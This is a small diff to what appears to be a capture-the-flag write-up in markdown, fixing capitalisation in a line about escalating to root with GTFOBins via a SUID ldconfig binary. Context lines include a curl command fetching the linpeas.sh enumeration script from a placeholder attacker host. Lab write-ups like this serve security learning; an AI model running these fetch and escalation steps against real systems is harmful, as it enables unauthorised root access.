@@ -151,5 +151,5 @@ curl -O http://IP:80/linpeas.sh
 ```bash
 -rwsr-xr-x 1 root root 978K Apr 21  2021 /sbin/ldconfig
 ```
-### I use the GTFOBins Website to exploit the vulnerability, I just follow the instructions and i got a shell as root
+### I use the GTFOBins Website to exploit the vulnerability, I just follow the instructions and I got a shell as root
 gtfobins -> ldconfig
